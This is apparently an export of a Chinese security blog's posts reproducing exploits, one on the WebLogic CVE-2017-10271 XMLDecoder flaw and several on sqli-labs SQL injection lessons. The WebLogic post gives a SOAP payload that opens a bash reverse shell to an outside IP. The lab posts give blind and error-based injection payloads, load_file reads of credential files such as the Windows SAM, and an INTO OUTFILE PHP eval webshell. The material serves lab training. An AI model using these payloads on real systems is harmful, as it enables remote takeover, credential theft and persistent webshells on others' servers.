    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2017-10271漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限</p>
<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfoces搭建漏洞环境</p>
<p><img src="https://qiniu.hzktester.top/tp2020092701.png" alt="image"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
<li>访问地址<strong><a href="http://47.101.62.20:27036/">http://47.101.62.20:27036/</a></strong> 页面长这样</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020092702.png" alt="image"><br>2. 访问<strong><a href="http://47.101.62.20:27036/wls-wsat/CoordinatorPortType11">http://47.101.62.20:27036/wls-wsat/CoordinatorPortType11</a></strong>，存在下图则有可能存在漏洞</p>
<p><img src="https://qiniu.hzktester.top/tp2020092703.png" alt="image"><br>3. 构造POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType11 HTTP&#x2F;1.1</span><br><span class="line">Host: 47.101.62.20:27036</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko&#x2F;20100101 Firefox&#x2F;48.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 756</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.101.62.20&#x2F;1234 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092704.png" alt="image"></p>
<ol start="4">
<li>成功反弹shell，执行命令得到flag</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020092705.png" alt="image"></p>
<h2 id="poc验证脚本"><a href="#poc验证脚本" class="headerlink" title="poc验证脚本"></a>poc验证脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding:utf-8</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">from sys import argv</span><br><span class="line"> </span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">	&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko&#x2F;20100101 Firefox&#x2F;48.0&#39;,</span><br><span class="line">	&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">	&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><br><span class="line">	&#39;Content-Type&#39;: &#39;text&#x2F;xml&#39;</span><br><span class="line">    &#125;</span><br><span class="line">def Webogic_XMLDecoder_poc(url):</span><br><span class="line">	#url&#x3D;&quot;http:&#x2F;&#x2F;47.101.62.20:27036&quot;</span><br><span class="line">	posturl&#x3D;url+&#39;&#x2F;wls-wsat&#x2F;CoordinatorPortType&#39;</span><br><span class="line">	data &#x3D; &#39;&#39;&#39;</span><br><span class="line">	&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">		&lt;soapenv:Header&gt;</span><br><span class="line">			&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">				&lt;java version&#x3D;&quot;1.6.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">					&lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">						&lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wls-wsat&#x2F;54p17w&#x2F;war&#x2F;test.txt&lt;&#x2F;string&gt;&lt;void method&#x3D;&quot;println&quot;&gt;</span><br><span class="line">						&lt;string&gt;xmldecoder_vul_test&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">					&lt;&#x2F;object&gt;</span><br><span class="line">				&lt;&#x2F;java&gt;</span><br><span class="line">			&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">		&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">		&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">	</span><br><span class="line">	print url</span><br><span class="line">	try:</span><br><span class="line">		r&#x3D;requests.post(posturl,data&#x3D;data,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">		geturl&#x3D;url+&quot;&#x2F;wls-wsat&#x2F;test.txt&quot;</span><br><span class="line">		#print geturl</span><br><span class="line">		check_result &#x3D; requests.get(geturl,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">		if &#39;xmldecoder_vul_test&#39; in check_result.text:</span><br><span class="line">			print u&quot;存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;</span><br><span class="line">	except:</span><br><span class="line">		pass</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	if len(argv) &#x3D;&#x3D; 1:</span><br><span class="line">		print &quot;Please input python Webogic_XMLDecoder_poc.py http:&#x2F;&#x2F;xxxx:7001&quot;</span><br><span class="line">		exit(0)</span><br><span class="line">	else:</span><br><span class="line">		url &#x3D; argv[1]</span><br><span class="line">	Webogic_XMLDecoder_poc(url)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>WebLogic</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs-Background-3 导入导出的相关操作</title>
    <url>/posts/a7d7c886.html</url>
    <content><![CDATA[<h2 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h2><blockquote>
<p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
</blockquote>
<h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><ol>
<li>必须有权限读取并且文件必须完全可读 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0&#x2F;*    &#x2F;&#x2F;如果结果返回正常,说明具有读写权限。</span><br><span class="line">and (select count(*) from mysql.user)&gt;0&#x2F;*    &#x2F;&#x2F;返回错误，应该是管理员给数据库帐户降权了</span><br></pre></td></tr></table></figure></li>
<li>欲读取文件必须在服务器上</li>
<li>必须指定文件完整的路径</li>
<li>欲读取文件必须小于 max_allowed_packet<blockquote>
<p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的<br>就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有<br>administrators 才能访问的文件，users 就别想 load_file 出来</p>
</blockquote>
</li>
</ol>
<h3 id="在实际的注入中，有两个难点需要解决："><a href="#在实际的注入中，有两个难点需要解决：" class="headerlink" title="在实际的注入中，有两个难点需要解决："></a>在实际的注入中，有两个难点需要解决：</h3><ol>
<li>绝对物理路径</li>
<li>构造有效的畸形语句（报错爆出绝对路径）<blockquote>
<p>在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors = on，程序就会暴露<br>WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务<br>器的安全将受到严重的威胁.</p>
</blockquote>
</li>
</ol>
<h3 id="常用路径："><a href="#常用路径：" class="headerlink" title="常用路径："></a>常用路径：</h3><h4 id="WINDOWS下："><a href="#WINDOWS下：" class="headerlink" title="WINDOWS下："></a>WINDOWS下：</h4><table>
<thead>
<tr>
<th>路径</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>c:/boot.ini</td>
<td>查看系统版本</td>
</tr>
<tr>
<td>c:/windows/php.ini 或 c:/winnt/php.ini</td>
<td>php配置信息</td>
</tr>
<tr>
<td>c:/windows/my.ini 或 c:/winnt/my.ini 或 C:\Program Files\mysql\my.ini</td>
<td>MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</td>
</tr>
<tr>
<td>c:\mysql\data\mysql\user.MYD</td>
<td>存储了mysql.user表中的数据库连接密码</td>
</tr>
<tr>
<td>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini</td>
<td>存储了虚拟主机网站路径和密码</td>
</tr>
<tr>
<td>c:\Program Files\Serv-U\ServUDaemon.ini</td>
<td>存储了虚拟主机网站路径和密码</td>
</tr>
<tr>
<td>c:\windows\system32\inetsrv\MetaBase.xml</td>
<td>查看IIS的虚拟主机配置</td>
</tr>
<tr>
<td>c:\windows\repair\sam</td>
<td>存储了WINDOWS系统初次安装的密码</td>
</tr>
<tr>
<td>c:\Program Files\ Serv-U\ServUAdmin.exe</td>
<td>6.0版本以前的serv-u管理员密码存储</td>
</tr>
<tr>
<td>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</td>
<td>serv-u管理员密码存储</td>
</tr>
<tr>
<td>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</td>
<td>存储了pcAnywhere的登陆密码</td>
</tr>
<tr>
<td>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf</td>
<td>查看WINDOWS系统apache文件</td>
</tr>
<tr>
<td>c:/Resin-3.0.14/conf/resin.conf</td>
<td>查看jsp开发的网站 resin文件配置信息</td>
</tr>
<tr>
<td>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf</td>
<td>查看linux系统配置的JSP虚拟主机</td>
</tr>
<tr>
<td>C:\mysql\data\mysql\user.MYD</td>
<td>存在MYSQL系统中的用户密码</td>
</tr>
</tbody></table>
<h4 id="LUNIX-UNIX-下"><a href="#LUNIX-UNIX-下" class="headerlink" title="LUNIX/UNIX 下:"></a>LUNIX/UNIX 下:</h4><table>
<thead>
<tr>
<th>路径</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>/usr/local/app/apache2/conf/httpd.conf</td>
<td>apache2缺省配置文件</td>
</tr>
<tr>
<td>/usr/local/apache2/conf/httpd.conf</td>
<td>apache2缺省配置文件</td>
</tr>
<tr>
<td>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</td>
<td>虚拟网站设置</td>
</tr>
<tr>
<td>/usr/local/app/php5/lib/php.ini</td>
<td>PHP相关设置</td>
</tr>
<tr>
<td>/etc/sysconfig/iptables</td>
<td>从中得到防火墙规则策略</td>
</tr>
<tr>
<td>/etc/httpd/conf/httpd.conf</td>
<td>apache配置文件</td>
</tr>
<tr>
<td>/etc/rsyncd.conf</td>
<td>同步程序配置文件</td>
</tr>
<tr>
<td>/etc/my.cnf</td>
<td>mysql的配置文件</td>
</tr>
<tr>
<td>/etc/redhat-release 或 /etc/issue 或 /etc/issue.net</td>
<td>系统版本</td>
</tr>
<tr>
<td>/etc/httpd/conf/httpd.conf 或 /usr/local/apche/conf/httpd.conf</td>
<td>查看linux APACHE虚拟主机配置文件</td>
</tr>
<tr>
<td>/usr/local/resin-3.0.22/conf/resin.conf</td>
<td>针对3.0.22的RESIN配置文件查看</td>
</tr>
<tr>
<td>/usr/local/resin-pro-3.0.22/conf/resin.conf</td>
<td>针对3.0.22的RESIN配置文件查看</td>
</tr>
<tr>
<td>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</td>
<td>查看jsp开发的网站 resin文件配置信息</td>
</tr>
<tr>
<td>load_file(char(47))</td>
<td>列出FreeBSD,Sunos系统根目录</td>
</tr>
<tr>
<td>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</td>
<td></td>
</tr>
<tr>
<td>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</td>
<td></td>
</tr>
</tbody></table>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))</span><br></pre></td></tr></table></figure>
<p>利用hex()将文件内容导出来，尤其是smb文件时使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">    &#x2F;&#x2F;char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:&#x2F;boot.ini”的 ASCII 代码</span><br><span class="line">union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</span><br><span class="line">    &#x2F;&#x2F;“c:&#x2F;boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”</span><br><span class="line">union select 1,1,1,load_file(c:\\boot.ini)</span><br><span class="line">    &#x2F;&#x2F;路径里的&#x2F;用 \\代替</span><br></pre></td></tr></table></figure>

<h2 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h2><h3 id="LOAD-DATA-INFILE-语句"><a href="#LOAD-DATA-INFILE-语句" class="headerlink" title="LOAD DATA INFILE 语句"></a>LOAD DATA INFILE 语句</h3><p><strong>LOAD DATA INFILE</strong> 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p>
<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data infile &#39;&#x2F;tmp&#x2F;test.txt&#39; into table test character set gbk fields terminated by &#39;\t&#39; lines terminated by &#39;\n&#39;</span><br></pre></td></tr></table></figure>
<p>将/tmp/test.txt 导入到 test 表中，<strong>character set gbk</strong> 是字符集设置为<strong>gbk</strong>，<strong>fields terminated by</strong> 是每一项数据之间的分隔符，<strong>lines terminated by</strong> 是行的结尾符。</p>
<h2 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h2><h3 id="INFO-OUTFILE语句"><a href="#INFO-OUTFILE语句" class="headerlink" title="INFO OUTFILE语句"></a>INFO OUTFILE语句</h3><p>直接上传一句话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-6</title>
    <url>/posts/3ef022d0.html</url>
    <content><![CDATA[<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><blockquote>
<p>Less6 与 less5 的区别在于 less6 在 id 参数传到服务器时，对 id 参数进行了处理。这里可以从源代码中可以看到。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>这一关的策略和less5是一样的，只需要将’换为”即可</p>
<p>演示其中一个payload。使用left()函数布尔注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-6&#x2F;?id&#x3D;1%22and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092409.png" alt="image"></p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-5(延时盲注)</title>
    <url>/posts/39947c43.html</url>
    <content><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>下面使用延时盲注演示</p>
<h3 id="利用sleep-函数"><a href="#利用sleep-函数" class="headerlink" title="利用sleep()函数"></a>利用sleep()函数</h3><p>sql语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and If(ascii(substr(database(),1,1))&#x3D;116,1,sleep(5))</span><br></pre></td></tr></table></figure>
<p>payload请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20If(ascii(substr(database(),1,1))&#x3D;116,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>当dadabase()的ASCII值不是116就延时5s然后页面返回空。此处改为115是正确返回</p>
<p><img src="https://qiniu.hzktester.top/tp2020092407.png" alt="image"></p>
<h3 id="利用-BENCHMARK-进行延时注入"><a href="#利用-BENCHMARK-进行延时注入" class="headerlink" title="利用 BENCHMARK()进行延时注入"></a>利用 BENCHMARK()进行延时注入</h3><p>sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1</span><br></pre></td></tr></table></figure>
<p>payload请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27UNION%20SELECT%20(IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(%27MSG%27,%27by%205%20seconds%27)),null)),2,3%20FROM%20(select%20database()%20as%20current)%20as%20tb1--+</span><br></pre></td></tr></table></figure>
<p>这里当返回结果正确的时候会延时5s返回，错误时不延时</p>
<p><img src="https://qiniu.hzktester.top/tp2020092408.png" alt="image"></p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-5(报错盲注)</title>
    <url>/posts/d416df9e.html</url>
    <content><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>下面使用报错盲注来演示</p>
<h3 id="BUG-8652报错盲注"><a href="#BUG-8652报错盲注" class="headerlink" title="BUG #8652报错盲注"></a>BUG #8652报错盲注</h3><p>sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a</span><br></pre></td></tr></table></figure>
<p>请求payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20Select%201,count(*),concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092401.png" alt="image"></p>
<h3 id="利用double数值类型超出范围进行报错注入"><a href="#利用double数值类型超出范围进行报错注入" class="headerlink" title="利用double数值类型超出范围进行报错注入"></a>利用double数值类型超出范围进行报错注入</h3><p>sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select (exp(~(select * FROM(SELECT USER())a))),2, 3</span><br></pre></td></tr></table></figure>
<p>请求payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20(exp(~(select%20*%20FROM(SELECT%20USER())a))),2,%203--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092402.png" alt="image"></p>
<h3 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a>利用 bigint 溢出进行报错注入</h3><p>sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select (!(select * from (select user())x) - ~0),2,3</span><br></pre></td></tr></table></figure>
<p>请求payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20(!(select%20*%20from%20(select%20user())x)%20-%20~0),2,3--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092403.png" alt="image"></p>
<h3 id="xpath函数报错注入"><a href="#xpath函数报错注入" class="headerlink" title="xpath函数报错注入"></a>xpath函数报错注入</h3><h4 id="使用extractvalue-函数"><a href="#使用extractvalue-函数" class="headerlink" title="使用extractvalue()函数"></a>使用extractvalue()函数</h4><p>sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure>
<p>请求payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,(select%20@@version),0x7e))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092404.png" alt="image"></p>
<h4 id="使用updatexml-函数"><a href="#使用updatexml-函数" class="headerlink" title="使用updatexml()函数"></a>使用updatexml()函数</h4><p>sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure>
<p>请求payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092405.png" alt="image"></p>
<h3 id="利用数据的重复性报错注入"><a href="#利用数据的重复性报错注入" class="headerlink" title="利用数据的重复性报错注入"></a>利用数据的重复性报错注入</h3><p>sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x</span><br></pre></td></tr></table></figure>
<p>请求payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27union%20select%201,2,3%20from%20(select%20NAME_CONST(version(),1),%20NAME_CONST(version(),1))x%20--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092406.png" alt="image"></p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-5(布尔盲注)</title>
    <url>/posts/a1c378af.html</url>
    <content><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><blockquote>
<p>我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示<br>一下使用方法。</p>
</blockquote>
<p>这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以<br>看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，<br>所以我们不能利用上述 less1-4 的方法</p>
<p><img src="https://qiniu.hzktester.top/tp2020092308.png" alt="image"></p>
<h3 id="利用left-函数注入"><a href="#利用left-函数注入" class="headerlink" title="利用left()函数注入"></a>利用left()函数注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
<p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，明显的返回的结果是正确的。</p>
<p><img src="https://qiniu.hzktester.top/tp2020092309.png" alt="image"></p>
<p>当版本号不对的时候，则显示为空</p>
<p><img src="https://qiniu.hzktester.top/tp2020092310.png" alt="image"></p>
<p>猜测数据库长度，已知数据库长度为8</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(length(database()),1)&#x3D;8--+  &#x2F;&#x2F;length(database())得到数据库的长度</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092311.png" alt="image"></p>
<p>猜测数据库第一位</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),1)%3E%27a%27--+</span><br></pre></td></tr></table></figure>
<p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率。</p>
<p><img src="https://qiniu.hzktester.top/tp2020092312.png" alt="image"></p>
<p>猜测数据库第二位，得知第一位是s，我们看前两位是否大于sa</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),2)%3E%27sa%27--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092313.png" alt="image"></p>
<p>往下的举一反三。即可得到完整的数据库名</p>
<h3 id="利用substr-ascii-注入"><a href="#利用substr-ascii-注入" class="headerlink" title="利用substr()ascii()注入"></a>利用substr()ascii()注入</h3><p>根据以上得知数据库名为 security，那我们利用此方式获取 security 数据库下的表。<br>获取 security 数据库的第一个表的第一个字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),1,1))&gt;101--+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因<br>为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止，此处应该是 101，因为第一个表示 email。</p>
</blockquote>
<p><img src="https://qiniu.hzktester.top/tp2020092314.png" alt="image"></p>
<p>如何获取第一个表的第二位字符呢？<br>这里我们已经了解了 substr()函数，这里使用 substr(**,2,1)即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),2,1))&gt;101--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092315.png" alt="image"></p>
